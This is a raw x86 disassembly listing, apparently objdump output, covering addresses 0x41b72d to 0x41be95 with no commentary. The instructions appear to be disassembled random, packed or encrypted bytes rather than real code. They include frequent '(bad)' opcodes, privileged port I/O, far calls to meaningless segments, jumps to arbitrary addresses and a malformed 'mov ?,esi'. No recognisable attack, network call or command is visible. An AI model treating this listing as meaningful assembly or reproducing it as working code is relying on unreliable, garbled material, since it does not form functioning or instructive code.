  41b72d:	push   ebp
  41b72e:	test   BYTE PTR [ebx+0x64a2c8ce],dl
  41b734:	lds    edx,FWORD PTR [edx]
  41b736:	pop    ebp
  41b737:	adc    DWORD PTR [edx+0x78],eax
  41b73a:	and    ch,BYTE PTR [esi+ecx*1-0x49681967]
  41b741:	mov    ecx,0x40139391
  41b746:	es jmp 0x41b6d9
  41b749:	or     eax,0xdbaddc1b
  41b74e:	js     0x41b713
  41b750:	xchg   edi,eax
  41b751:	not    esp
  41b753:	jge    0x41b7a4
  41b755:	push   ss
  41b756:	cld    
  41b757:	and    al,0x63
  41b759:	sbb    ah,dl
  41b75b:	sub    eax,0xc7ff157c
  41b760:	mov    BYTE PTR [esi],ah
  41b762:	out    dx,eax
  41b763:	mov    ch,0x9a
  41b765:	or     eax,0xb26161a0
  41b76a:	or     dl,BYTE PTR [ecx+0x2a]
  41b76d:	add    edi,edi
  41b76f:	and    DWORD PTR [ebx+0xb55e1f7],ebp
  41b775:	imul   ax,WORD PTR [edx+esi*1],0x1d
  41b77a:	ins    BYTE PTR es:[edi],dx
  41b77b:	adc    BYTE PTR [edx],bh
  41b77d:	icebp  
  41b77e:	nop
  41b77f:	jbe    0x41b77a
  41b781:	clc    
  41b782:	addr16 out 0x41,al
  41b785:	jmp    0xeb8e72e
  41b78a:	push   esp
  41b78b:	dec    edx
  41b78c:	xor    DWORD PTR [edx],eax
  41b78e:	in     al,dx
  41b78f:	inc    ebx
  41b790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b791:	xchg   BYTE PTR [ebx+0x77],bl
  41b794:	add    eax,0x8cd240c5
  41b799:	sub    al,0x8b
  41b79b:	sti    
  41b79c:	into   
  41b79d:	mov    eax,0x62de5356
  41b7a2:	cs cmp dl,dh
  41b7a5:	xor    ebp,ebp
  41b7a7:	cwde   
  41b7a8:	int3   
  41b7a9:	xor    al,0xd7
  41b7ab:	pusha  
  41b7ac:	mov    ch,0x79
  41b7ae:	scas   al,BYTE PTR es:[edi]
  41b7af:	loope  0x41b7c7
  41b7b1:	or     DWORD PTR [ebx+ecx*4],esp
  41b7b4:	xlat   BYTE PTR ds:[ebx]
  41b7b5:	shl    ecx,1
  41b7b7:	fwait
  41b7b8:	dec    edx
  41b7b9:	(bad)  
  41b7ba:	lods   eax,DWORD PTR ds:[esi]
  41b7bb:	les    eax,FWORD PTR [edi-0x36]
  41b7be:	fidiv  WORD PTR [edx]
  41b7c0:	outs   dx,BYTE PTR ds:[esi]
  41b7c1:	cdq    
  41b7c2:	loope  0x41b773
  41b7c4:	fiadd  WORD PTR [ebp-0x63d6fa68]
  41b7ca:	pop    ebx
  41b7cb:	mov    ch,0x74
  41b7cd:	xchg   BYTE PTR [edx+0x73],dh
  41b7d0:	iret   
  41b7d1:	sbb    eax,0xee6fed73
  41b7d6:	(bad)  
  41b7d7:	and    eax,0x69e20886
  41b7dc:	push   ecx
  41b7dd:	imul   BYTE PTR [edx+eax*1]
  41b7e0:	and    eax,0x29d35aef
  41b7e5:	mov    ah,0xbe
  41b7e7:	push   esi
  41b7e8:	shl    BYTE PTR [ecx],cl
  41b7ea:	mov    ss,WORD PTR [ebp+0x77c1b511]
  41b7f0:	(bad)  
  41b7f1:	jle    0x41b7b6
  41b7f3:	mov    ebp,0x23099fb4
  41b7f8:	int    0x1e
  41b7fa:	sbb    DWORD PTR [esi-0x78],ebx
  41b7fd:	and    esp,DWORD PTR [ecx+0x51]
  41b800:	jp     0x41b784
  41b802:	mov    ah,0x56
  41b804:	dec    ecx
  41b805:	(bad)  
  41b806:	repnz add eax,0x47a82ee9
  41b80c:	loop   0x41b81c
  41b80e:	or     WORD PTR [edi+ecx*1+0x63835b7c],ax
  41b816:	out    0x2d,al
  41b818:	or     BYTE PTR [ecx],dh
  41b81a:	addr16 mov ch,0x10
  41b81d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b81e:	call   0x2a8e:0x50195b54
  41b825:	or     ebp,DWORD PTR [esi+0x4234c22b]
  41b82b:	in     eax,dx
  41b82c:	jmp    0x41b7ec
  41b82e:	mov    gs,WORD PTR [edx]
  41b830:	adc    cl,bh
  41b832:	int3   
  41b833:	xchg   ebp,eax
  41b834:	pushf  
  41b835:	aaa    
  41b836:	(bad)  
  41b837:	idiv   ch
  41b839:	fcomi  st,st(1)
  41b83b:	cs cwde 
  41b83d:	jle    0x41b869
  41b83f:	test   al,0x16
  41b841:	jge    0x41b8af
  41b843:	xchg   DWORD PTR [eax+0x4df2011d],ecx
  41b849:	jp     0x41b85d
  41b84b:	nop
  41b84c:	inc    esi
  41b84d:	ret    0xaa7d
  41b850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b851:	outs   dx,BYTE PTR ds:[esi]
  41b852:	sbb    BYTE PTR [eax],dh
  41b854:	adc    al,BYTE PTR [ebp-0x1fdb65c3]
  41b85a:	and    BYTE PTR [ecx],dh
  41b85c:	test   al,0xa
  41b85e:	add    BYTE PTR [eax],dl
  41b860:	cmp    BYTE PTR [ecx],cl
  41b862:	int3   
  41b863:	cmp    BYTE PTR [ecx+0x3e49b20d],ch
  41b869:	mov    eax,0x1e6202a2
  41b86e:	dec    eax
  41b86f:	cmp    dh,0x42
  41b872:	xlat   BYTE PTR ds:[ebx]
  41b873:	mov    al,0xd
  41b875:	stos   BYTE PTR es:[edi],al
  41b876:	push   esp
  41b877:	push   eax
  41b878:	xlat   BYTE PTR ds:[ebx]
  41b879:	mov    dh,0x46
  41b87b:	inc    esp
  41b87c:	mov    ?,esi
  41b87e:	ret    
  41b87f:	les    esp,FWORD PTR [ebp-0x8]
  41b882:	push   cs
  41b883:	cwde   
  41b884:	push   esp
  41b885:	pop    ds
  41b886:	and    BYTE PTR [ecx],dh
  41b888:	jecxz  0x41b8ca
  41b88a:	ret    
  41b88b:	clc    
  41b88c:	rcr    DWORD PTR [esi-0x4f57545b],cl
  41b892:	inc    ecx
  41b893:	(bad)  
  41b894:	pop    esi
  41b895:	push   es
  41b896:	add    eax,DWORD PTR [edi-0x44380a8e]
  41b89c:	cmp    al,0x93
  41b89e:	imul   BYTE PTR ss:[ebx]
  41b8a1:	ins    DWORD PTR es:[edi],dx
  41b8a2:	enter  0x3878,0xb8
  41b8a6:	stc    
  41b8a7:	jno    0x41b870
  41b8a9:	inc    esp
  41b8aa:	add    BYTE PTR [ebp+0x45],ah
  41b8ad:	(bad)  
  41b8af:	out    0x83,al
  41b8b1:	dec    ebx
  41b8b2:	dec    ebx
  41b8b3:	inc    edx
  41b8b4:	add    eax,0x7e19d08b
  41b8b9:	push   0x797cb006
  41b8be:	ret    0x99fc
  41b8c1:	or     cl,BYTE PTR [edx+0x61]
  41b8c4:	lahf   
  41b8c5:	es mov dl,0x85
  41b8c8:	aas    
  41b8c9:	test   al,0x2b
  41b8cb:	loopne 0x41b8d2
  41b8cd:	mov    dl,0xca
  41b8cf:	ja     0x41b85b
  41b8d1:	pop    ecx
  41b8d2:	and    BYTE PTR [esi],0x24
  41b8d5:	or     BYTE PTR [esi],dh
  41b8d7:	dec    eax
  41b8d8:	or     esi,ebp
  41b8da:	call   FWORD PTR [esi+0x10bcf48c]
  41b8e0:	shr    DWORD PTR [edx],1
  41b8e2:	xchg   ebp,eax
  41b8e3:	enter  0x79ba,0xed
  41b8e7:	push   0xe9472ba4
  41b8ec:	xor    edi,DWORD PTR [edx+0xb]
  41b8ef:	lods   eax,DWORD PTR ds:[esi]
  41b8f0:	mov    eax,ds:0x6a4f645a
  41b8f5:	pop    eax
  41b8f6:	in     al,dx
  41b8f7:	push   ss
  41b8f8:	lods   al,BYTE PTR ds:[esi]
  41b8f9:	sub    esp,DWORD PTR [edi]
  41b8fb:	pushf  
  41b8fc:	out    dx,al
  41b8fd:	test   BYTE PTR [edi],al
  41b8ff:	inc    edx
  41b900:	xchg   ebp,ebp
  41b902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b903:	or     DWORD PTR [esi+0x14b4cf0c],0xfaf013d0
  41b90d:	mov    WORD PTR [edx],es
  41b90f:	mov    ds:0xfb7b4b7f,al
  41b914:	rol    BYTE PTR [edx],0xdc
  41b917:	stos   BYTE PTR es:[edi],al
  41b918:	imul   esi,esp,0xd1722532
  41b91e:	mov    esi,DWORD PTR [ebx]
  41b920:	push   eax
  41b921:	mov    dh,0xb7
  41b923:	and    edx,DWORD PTR [ecx+0x4c07bb41]
  41b929:	dec    ebp
  41b92a:	sub    eax,0x97d36562
  41b92f:	adc    DWORD PTR [ecx-0x61],eax
  41b932:	adc    al,0xd0
  41b934:	add    eax,0x5cf04683
  41b939:	not    BYTE PTR [esi-0x30]
  41b93c:	std    
  41b93d:	es jmp 0x671a:0xdd2d5b65
  41b945:	jge    0x41b92f
  41b947:	psubusw mm4,mm3
  41b94a:	or     edi,ebx
  41b94c:	xchg   ebx,eax
  41b94d:	ret    0x621
  41b950:	mov    cl,0x26
  41b952:	test   al,0x17
  41b954:	repz cs jns 0x41b9bd
  41b958:	enter  0x88f2,0x89
  41b95c:	and    BYTE PTR [edx-0x39],ah
  41b95f:	jbe    0x41b978
  41b961:	test   ah,ch
  41b963:	adc    dh,BYTE PTR [edx+0x6f]
  41b966:	clc    
  41b967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b968:	mov    eax,ds:0xf6706517
  41b96d:	test   eax,0xd0096b34
  41b972:	jae    0x41b973
  41b974:	stc    
  41b975:	xchg   DWORD PTR [ebx],ebx
  41b977:	jmp    0xd74c:0x806237f5
  41b97e:	and    ch,BYTE PTR [ecx-0x1d]
  41b981:	mov    ebp,0xf7716fda
  41b986:	test   BYTE PTR [ebp-0x3045c1c5],0xa6
  41b98d:	xchg   ebx,eax
  41b98e:	sub    BYTE PTR [ebp-0x49],ah
  41b991:	sub    BYTE PTR [esi-0x48],al
  41b994:	loope  0x41b91f
  41b996:	in     eax,dx
  41b997:	fs mov ecx,0x2aef61a7
  41b99d:	mov    edi,0x7ba62aa3
  41b9a2:	push   edi
  41b9a3:	cli    
  41b9a4:	ins    DWORD PTR es:[edi],dx
  41b9a5:	dec    edx
  41b9a6:	mov    al,ds:0x619b9d18
  41b9ab:	aad    0x3f
  41b9ad:	dec    edi
  41b9ae:	cmp    eax,0x7fad9d13
  41b9b3:	push   cs
  41b9b4:	mov    ds:0x9302ce00,al
  41b9b9:	adc    al,ah
  41b9bb:	stos   DWORD PTR es:[edi],eax
  41b9bc:	mov    edx,0xb9a56ad0
  41b9c1:	push   0x8fba845a
  41b9c6:	inc    edi
  41b9c7:	cmp    al,0xa5
  41b9c9:	sbb    DWORD PTR [edx],edx
  41b9cb:	fldcw  WORD PTR [ebp+0x7]
  41b9ce:	sub    BYTE PTR [ecx+0x69],cl
  41b9d1:	adc    bl,BYTE PTR [ebx+0x659d66bc]
  41b9d7:	sahf   
  41b9d8:	int    0x94
  41b9da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9db:	lods   eax,DWORD PTR ds:[esi]
  41b9dc:	sbb    esp,DWORD PTR [ebx]
  41b9de:	lods   eax,DWORD PTR ds:[esi]
  41b9df:	test   BYTE PTR [ebx],ch
  41b9e1:	dec    DWORD PTR [eax]
  41b9e3:	popf   
  41b9e4:	and    dl,BYTE PTR [edi-0x30]
  41b9e7:	sub    al,0x75
  41b9e9:	ins    BYTE PTR es:[edi],dx
  41b9ea:	inc    ebx
  41b9eb:	gs dec ebx
  41b9ed:	push   eax
  41b9ee:	add    eax,0xdc3c7b79
  41b9f3:	xor    esi,DWORD PTR [esi+0x250bb557]
  41b9f9:	sbb    BYTE PTR ds:0x57a231c6,dh
  41b9ff:	jle    0x41b9d6
  41ba01:	pushf  
  41ba02:	repz mov ah,0xf9
  41ba05:	ins    DWORD PTR es:[edi],dx
  41ba06:	retf   
  41ba07:	gs mov dh,0x4e
  41ba0a:	sbb    al,0x93
  41ba0c:	ja     0x41b9c4
  41ba0e:	xchg   esi,eax
  41ba0f:	mov    ch,0xc9
  41ba11:	cdq    
  41ba12:	mov    ebp,0xab8fc763
  41ba17:	cmp    ah,bh
  41ba19:	or     al,0xe5
  41ba1b:	iret   
  41ba1c:	cmp    ch,BYTE PTR [esi-0x1a]
  41ba1f:	cmp    DWORD PTR [ecx],0xfffffff7
  41ba22:	jae    0x41ba4c
  41ba24:	out    dx,al
  41ba25:	data16 fidivr WORD PTR [esi-0x29b2b1d3]
  41ba2c:	push   ss
  41ba2d:	cmp    al,0x87
  41ba2f:	js     0x41ba1f
  41ba31:	mov    ecx,DWORD PTR [eax+ecx*4-0x2a]
  41ba35:	popf   
  41ba36:	push   0xb3d03bc7
  41ba3b:	push   edx
  41ba3c:	add    esi,esi
  41ba3e:	sub    DWORD PTR [esi-0x4c],ecx
  41ba41:	ins    DWORD PTR es:[edi],dx
  41ba42:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41ba44:	xchg   edx,eax
  41ba45:	call   0xe853ce0b
  41ba4a:	push   0x471c9934
  41ba4f:	pushf  
  41ba50:	popa   
  41ba51:	aam    0xac
  41ba53:	cmp    dl,BYTE PTR [edi]
  41ba55:	or     al,BYTE PTR [esi]
  41ba57:	shl    BYTE PTR [ebx],1
  41ba59:	mov    edx,0x611868c5
  41ba5e:	aam    0x74
  41ba60:	and    bh,BYTE PTR [ebx]
  41ba62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba63:	jmp    0x41ba22
  41ba65:	imul   edx,DWORD PTR [edi+0x60],0xe19e457a
  41ba6c:	les    edx,FWORD PTR [ebp-0x2a]
  41ba6f:	adc    ecx,DWORD PTR [esi+0x65]
  41ba72:	and    eax,eax
  41ba74:	in     al,0x9d
  41ba76:	scas   al,BYTE PTR es:[edi]
  41ba77:	pushf  
  41ba78:	and    ah,cl
  41ba7a:	inc    edx
  41ba7b:	test   al,0x83
  41ba7d:	push   es
  41ba7e:	out    dx,eax
  41ba7f:	jp     0x41bac2
  41ba81:	imul   edi
  41ba83:	and    BYTE PTR [ebp-0x18a1aa08],al
  41ba89:	dec    esp
  41ba8a:	dec    ebx
  41ba8b:	repnz pushf 
  41ba8d:	xchg   edx,eax
  41ba8e:	lahf   
  41ba8f:	push   0x2b
  41ba91:	ret    
  41ba92:	mov    bh,0x97
  41ba94:	mov    dh,0x3d
  41ba96:	push   es
  41ba97:	stc    
  41ba98:	dec    ebx
  41ba99:	imul   edi,ebp,0xffffff83
  41ba9c:	sbb    bl,BYTE PTR [ebx-0x61bff637]
  41baa2:	scas   eax,DWORD PTR es:[edi]
  41baa3:	mov    ebx,0x1c2c7ecd
  41baa8:	jb     0x41ba5c
  41baaa:	dec    edx
  41baab:	add    eax,0x1ef545ca
  41bab0:	add    BYTE PTR [eax-0x530c6094],0x10
  41bab7:	or     DWORD PTR [edx+ecx*2+0xdb89fac],ebx
  41babe:	ss loope 0x41ba4f
  41bac1:	jb     0x41babd
  41bac3:	lahf   
  41bac4:	div    DWORD PTR [ecx+0x5c]
  41bac7:	xchg   edi,eax
  41bac8:	fidivr WORD PTR [ecx]
  41baca:	sbb    bh,BYTE PTR ds:0x5330e24e
  41bad0:	ja     0x41ba75
  41bad2:	dec    esi
  41bad3:	sub    eax,0xafcddab7
  41bad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bad9:	cdq    
  41bada:	dec    eax
  41badb:	test   eax,edi
  41badd:	outs   dx,BYTE PTR ds:[esi]
  41bade:	scas   al,BYTE PTR es:[edi]
  41badf:	(bad)  
  41bae0:	fimul  WORD PTR [ebx]
  41bae2:	xchg   esp,eax
  41bae3:	fld    TBYTE PTR [eax]
  41bae5:	mov    al,ds:0x5fd36f1d
  41baea:	cmp    BYTE PTR [ecx-0x3c79084d],dl
  41baf0:	mov    ds:0x3d8d5ca3,eax
  41baf5:	mov    ds:0x55cb5516,eax
  41bafa:	and    dl,BYTE PTR [eax-0x27]
  41bafd:	fwait
  41bafe:	add    BYTE PTR [eax+0x3e],al
  41bb01:	pusha  
  41bb02:	neg    DWORD PTR [edx]
  41bb04:	jns    0x41babc
  41bb06:	adc    ecx,DWORD PTR [ebx]
  41bb08:	cdq    
  41bb09:	xchg   esi,eax
  41bb0a:	xor    BYTE PTR [edx+0x5b],ch
  41bb0d:	stos   BYTE PTR es:[edi],al
  41bb0e:	call   0x428e:0xa43c9d06
  41bb15:	bound  esp,QWORD PTR [ecx]
  41bb17:	dec    ebx
  41bb18:	popa   
  41bb19:	ins    DWORD PTR es:[edi],dx
  41bb1a:	idiv   DWORD PTR [ebx+0x529a71cf]
  41bb20:	push   0xffffff8c
  41bb22:	(bad)  
  41bb23:	add    DWORD PTR es:[edi],esp
  41bb26:	sub    eax,0xdcd45339
  41bb2b:	sbb    al,0xba
  41bb2d:	sub    al,0x22
  41bb2f:	ret    0x261a
  41bb32:	or     DWORD PTR [eax],edx
  41bb34:	fs adc eax,0x1637fdde
  41bb3a:	js     0x41bb82
  41bb3c:	sbb    BYTE PTR [ebx-0x4b8532e8],ch
  41bb42:	mov    dh,0xf4
  41bb44:	mov    ds:0xcaf7e10e,al
  41bb49:	sar    DWORD PTR [edi-0x7200c3ac],cl
  41bb4f:	pop    edx
  41bb50:	enter  0xa18f,0xf
  41bb54:	sbb    cl,BYTE PTR [eax]
  41bb56:	sub    BYTE PTR [ebx],bl
  41bb58:	outs   dx,DWORD PTR ds:[esi]
  41bb59:	and    DWORD PTR [ebp-0x8a23ad],esi
  41bb5f:	pop    ebp
  41bb60:	dec    ecx
  41bb61:	ds sti 
  41bb63:	xor    bh,BYTE PTR [ecx]
  41bb65:	jp     0x41bba4
  41bb67:	push   0x38
  41bb69:	mov    dl,0x16
  41bb6b:	out    0xa3,eax
  41bb6d:	xchg   edx,eax
  41bb6e:	ficomp WORD PTR [esi+0x75d7c4c2]
  41bb74:	mov    ch,0xfe
  41bb76:	in     eax,dx
  41bb77:	outs   dx,BYTE PTR ds:[esi]
  41bb78:	or     eax,0xe6e862a5
  41bb7d:	mov    esi,0x864c7c07
  41bb82:	cmp    dh,ah
  41bb84:	lods   al,BYTE PTR ds:[esi]
  41bb86:	inc    eax
  41bb87:	push   esp
  41bb88:	in     eax,dx
  41bb89:	stc    
  41bb8a:	xchg   esp,eax
  41bb8b:	push   0x32b1f302
  41bb90:	push   ecx
  41bb91:	popa   
  41bb92:	cmp    al,0xe8
  41bb94:	andnps xmm2,xmm2
  41bb97:	mov    ch,BYTE PTR [eiz*4+0x11397827]
  41bb9e:	jae    0x41bb83
  41bba0:	cmp    al,0x7
  41bba2:	mov    ch,0xbf
  41bba4:	push   eax
  41bba5:	jecxz  0x41bb39
  41bba7:	loop   0x41bbcf
  41bba9:	mov    edi,0xfdc4fef8
  41bbae:	sar    DWORD PTR [ecx],1
  41bbb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbb1:	in     al,0x6e
  41bbb3:	jmp    0x5d315336
  41bbb8:	call   0x7ce4:0x103928f6
  41bbbf:	out    dx,eax
  41bbc0:	xchg   esp,eax
  41bbc1:	cmp    eax,DWORD PTR [eax+0x3d3875e8]
  41bbc7:	xor    eax,0x40795dd9
  41bbcc:	pop    ds
  41bbcd:	sbb    eax,0xf955f3c3
  41bbd2:	inc    edi
  41bbd3:	iret   
  41bbd4:	aas    
  41bbd5:	jns    0x41bb89
  41bbd7:	loopne 0x41bb82
  41bbd9:	push   edi
  41bbda:	outs   dx,BYTE PTR ds:[esi]
  41bbdb:	adc    BYTE PTR ds:0x58d22256,ch
  41bbe1:	xchg   esi,eax
  41bbe2:	xor    al,0xdd
  41bbe4:	xor    eax,0x5d30c68f
  41bbe9:	stos   BYTE PTR es:[edi],al
  41bbea:	sbb    ch,ch
  41bbec:	ret    0xb5c
  41bbef:	lods   al,BYTE PTR ds:[esi]
  41bbf0:	cmp    eax,0x31bb3d55
  41bbf5:	mov    WORD PTR [ecx-0x23],ss
  41bbf8:	xchg   esp,eax
  41bbf9:	dec    esi
  41bbfa:	mov    ch,0xdf
  41bbfc:	mov    dh,0x79
  41bbfe:	mov    esp,0xc15484c6
  41bc03:	pop    es
  41bc04:	fild   DWORD PTR [ebx]
  41bc06:	mov    eax,0xede7761d
  41bc0b:	xor    ebp,DWORD PTR ds:0x48934ff9
  41bc11:	rcl    BYTE PTR [esi-0x4b9c2a17],cl
  41bc17:	mov    edi,0x81e90a62
  41bc1c:	inc    edx
  41bc1d:	dec    esi
  41bc1e:	rol    BYTE PTR [ecx+0x5],0xd3
  41bc22:	sub    ebx,edx
  41bc24:	mov    ds:0x14b00f9f,eax
  41bc29:	sub    DWORD PTR [ebx],edx
  41bc2b:	std    
  41bc2c:	das    
  41bc2d:	call   0xf253:0x87deb376
  41bc34:	loop   0x41bbd7
  41bc36:	sub    eax,0x62782145
  41bc3b:	retf   
  41bc3c:	xchg   edx,eax
  41bc3d:	sbb    DWORD PTR [eax+ebx*1-0xc],ecx
  41bc41:	inc    ebp
  41bc42:	push   ebp
  41bc43:	add    ebx,ebp
  41bc45:	mov    eax,0x76197184
  41bc4a:	sahf   
  41bc4b:	mov    edx,0xe2ba0414
  41bc50:	test   al,bl
  41bc52:	out    0x3e,al
  41bc54:	daa    
  41bc55:	xchg   ebp,eax
  41bc56:	xchg   ebx,eax
  41bc57:	jg     0x41bc1a
  41bc59:	je     0x41bcb5
  41bc5b:	mul    BYTE PTR [ebx]
  41bc5d:	sbb    DWORD PTR [edi+0x51],edi
  41bc60:	test   eax,0x76daa2b
  41bc65:	dec    esp
  41bc66:	ror    DWORD PTR [edx-0x3c6fa1c5],cl
  41bc6c:	dec    edx
  41bc6d:	retf   
  41bc6e:	and    BYTE PTR [esp+ebx*4-0x5c23c625],ch
  41bc75:	and    ch,BYTE PTR [esi-0x77]
  41bc78:	dec    edx
  41bc79:	push   edx
  41bc7a:	sub    ebp,eax
  41bc7c:	sub    DWORD PTR [ebx-0xf291ec9],edi
  41bc82:	or     eax,0x1bb7e90e
  41bc87:	arpl   WORD PTR [esi+0x2fca1868],bx
  41bc8d:	push   esp
  41bc8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc8f:	jae    0x41bc1b
  41bc91:	imul   esp,DWORD PTR [edx+ebx*1+0x15],0xd45baf39
  41bc99:	dec    ecx
  41bc9a:	mov    cl,0x9c
  41bc9c:	mov    ds:0x7814dbc0,al
  41bca1:	nop
  41bca2:	cwde   
  41bca3:	add    BYTE PTR [ebx],0x55
  41bca6:	cmp    eax,0xef66fe73
  41bcab:	scas   eax,DWORD PTR es:[edi]
  41bcac:	xor    eax,0xac8659f7
  41bcb1:	iret   
  41bcb2:	je     0x41bc62
  41bcb4:	jb     0x41bc3a
  41bcb6:	dec    ebp
  41bcb7:	jnp    0x41bd0a
  41bcb9:	jp     0x41bd2d
  41bcbb:	mov    ah,0xf0
  41bcbd:	jno    0x41bc79
  41bcbf:	xor    dh,BYTE PTR [eax]
  41bcc1:	pushf  
  41bcc2:	and    eax,0xee7e3564
  41bcc7:	sub    eax,0x2c8ea1bc
  41bccc:	std    
  41bccd:	add    ch,0xbf
  41bcd0:	dec    ecx
  41bcd1:	ss imul ecx,eax,0xffffff8f
  41bcd5:	mov    cl,0x7c
  41bcd7:	or     DWORD PTR ss:[edx],ebp
  41bcda:	xor    BYTE PTR [esp+ebp*2-0x5cf01f2f],ch
  41bce1:	cmp    eax,0x2827820a
  41bce6:	cli    
  41bce7:	mov    ebx,0xc95b14a9
  41bcec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bced:	or     eax,0xf49d3cf5
  41bcf2:	dec    eax
  41bcf3:	inc    ecx
  41bcf4:	push   eax
  41bcf5:	retf   0x172a
  41bcf8:	cmp    eax,0xf855d536
  41bcfd:	pop    eax
  41bcfe:	test   eax,0x89972386
  41bd03:	lods   al,BYTE PTR ds:[esi]
  41bd04:	pop    es
  41bd05:	(bad)  
  41bd06:	sub    al,0x18
  41bd08:	or     eax,0xc8d98fc6
  41bd0d:	cdq    
  41bd0e:	jb     0x41bd24
  41bd10:	rol    DWORD PTR [edx+0x6751dd8f],1
  41bd16:	fstp   DWORD PTR [edx+0x778da045]
  41bd1c:	mov    ds:0x91a97ca2,al
  41bd21:	imul   esi,DWORD PTR [ecx],0xffffffd2
  41bd24:	outs   dx,BYTE PTR ds:[esi]
  41bd25:	fisub  WORD PTR [esi]
  41bd27:	lea    esp,[esi+edi*1+0x31]
  41bd2b:	(bad)  
  41bd2f:	or     al,0xda
  41bd31:	adc    al,0xa4
  41bd33:	jg     0x41bcce
  41bd35:	jecxz  0x41bccc
  41bd37:	sub    edi,ecx
  41bd39:	adc    BYTE PTR [eax-0x35102577],bl
  41bd3f:	mov    ch,0xf1
  41bd41:	dec    ebx
  41bd42:	mov    ah,0xc6
  41bd44:	inc    esp
  41bd45:	inc    edi
  41bd46:	jecxz  0x41bd53
  41bd48:	add    al,0x1b
  41bd4a:	xor    al,0x92
  41bd4c:	and    al,0x8d
  41bd4e:	js     0x41bd2b
  41bd50:	into   
  41bd51:	push   esp
  41bd52:	xchg   ebp,eax
  41bd53:	add    eax,0x27d9a2f5
  41bd58:	imul   dl
  41bd5a:	jmp    0x95e23586
  41bd5f:	pop    edi
  41bd60:	or     edi,edx
  41bd62:	or     eax,0x1a367875
  41bd67:	scas   eax,DWORD PTR es:[edi]
  41bd68:	repnz inc edi
  41bd6a:	and    eax,0x22fc7eb6
  41bd6f:	ret    0x21de
  41bd72:	aas    
  41bd73:	pop    eax
  41bd74:	inc    esp
  41bd75:	aam    0x2c
  41bd77:	(bad)  
  41bd79:	js     0x41bd5e
  41bd7b:	pop    ebp
  41bd7c:	adc    BYTE PTR [ebx-0x7f],0xe2
  41bd80:	push   edi
  41bd81:	or     al,0x88
  41bd83:	xor    BYTE PTR [edi+0x6],0x3d
  41bd87:	and    eax,0xc98bb821
  41bd8c:	pop    ebp
  41bd8d:	add    BYTE PTR [ecx],ch
  41bd8f:	scas   eax,DWORD PTR es:[edi]
  41bd90:	test   eax,0x43c52717
  41bd95:	pop    ecx
  41bd96:	test   al,0x2e
  41bd98:	call   0x30264e94
  41bd9d:	add    al,0x9
  41bd9f:	in     eax,0xbc
  41bda1:	retf   0xdaf2
  41bda4:	call   0x3bc5:0x40d740c6
  41bdab:	inc    edx
  41bdac:	xchg   ecx,eax
  41bdad:	mov    ebp,DWORD PTR [esi+0x3]
  41bdb0:	push   0x53
  41bdb2:	out    0x9a,al
  41bdb4:	mov    ebp,0xa3ab8697
  41bdb9:	js     0x41bdb3
  41bdbb:	repnz mov al,ds:0x6a7b9858
  41bdc1:	xor    eax,0x49663b2d
  41bdc6:	test   eax,0x6cb9370f
  41bdcb:	push   ss
  41bdcc:	pop    ss
  41bdcd:	mov    ecx,0xc1dac8e7
  41bdd2:	or     eax,0xdd0b7878
  41bdd7:	out    dx,al
  41bdd8:	dec    ecx
  41bdd9:	push   0x3e836ded
  41bdde:	cmp    DWORD PTR ds:0xe8a4e699,esi
  41bde4:	mov    ecx,0xacd509b8
  41bde9:	dec    esp
  41bdea:	cmp    DWORD PTR ds:0x88fd5e16,ebp
  41bdf0:	sub    al,0xd8
  41bdf2:	push   0xffffffb0
  41bdf4:	test   DWORD PTR [ecx+0x685d68d1],0x415686f2
  41bdfe:	dec    edx
  41bdff:	cld    
  41be00:	xor    eax,DWORD PTR [ecx+ebp*1+0x3d]
  41be04:	in     al,dx
  41be05:	loopne 0x41be0c
  41be07:	or     edi,DWORD PTR [edx-0xc831f51]
  41be0d:	add    eax,0xdc6fa3e4
  41be12:	mov    eax,ds:0xb79e30
  41be17:	mov    eax,0xfb5d5d58
  41be1c:	jns    0x41be45
  41be1e:	out    0xe7,al
  41be20:	mov    eax,0xb12966cc
  41be25:	jb     0x41be53
  41be27:	and    DWORD PTR [esi-0x23],esp
  41be2a:	pop    ebp
  41be2b:	lods   eax,DWORD PTR ds:[esi]
  41be2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be2d:	cmp    dh,BYTE PTR [ecx-0x5d]
  41be30:	div    BYTE PTR [esi]
  41be32:	call   0x18b5d78c
  41be37:	pop    edi
  41be38:	mov    ds:0x4af1ab1c,eax
  41be3d:	call   0x3ea3b585
  41be42:	(bad)  
  41be43:	in     al,dx
  41be44:	out    dx,al
  41be45:	cld    
  41be46:	xadd   DWORD PTR [edx-0xc4c32bc],esi
  41be4d:	add    al,0xce
  41be4f:	inc    ebp
  41be50:	lock jl 0x41be4b
  41be53:	sub    DWORD PTR [ebx],edi
  41be55:	lock dec ebp
  41be57:	fldcw  WORD PTR fs:[edx-0x14ea8e40]
  41be5e:	and    DWORD PTR [bp+di-0x76],edx
  41be62:	scas   eax,DWORD PTR es:[edi]
  41be63:	sub    al,0x45
  41be65:	leave  
  41be66:	cmc    
  41be67:	loop   0x41beac
  41be69:	lods   al,BYTE PTR ss:[esi]
  41be6b:	outs   dx,BYTE PTR ds:[esi]
  41be6c:	mov    eax,ds:0x2573992f
  41be71:	scas   al,BYTE PTR es:[edi]
  41be72:	jnp    0x41bee5
  41be74:	or     BYTE PTR [ecx],0x63
  41be77:	xchg   BYTE PTR [edx+0x39],cl
  41be7a:	shl    DWORD PTR [edx+0x2677c809],1
  41be80:	mov    bh,0x85
  41be82:	in     al,dx
  41be83:	sar    dh,0x15
  41be86:	or     al,0xbd
  41be88:	push   esp
  41be89:	popf   
  41be8a:	xlat   BYTE PTR ds:[ebx]
  41be8b:	imul   esi,DWORD PTR [ebx],0x64
  41be8e:	pop    esi
  41be8f:	dec    edx
  41be90:	mov    eax,ds:0xcb4af070
  41be95:	cmp    esp,DWORD PTR [edx+eiz*4]
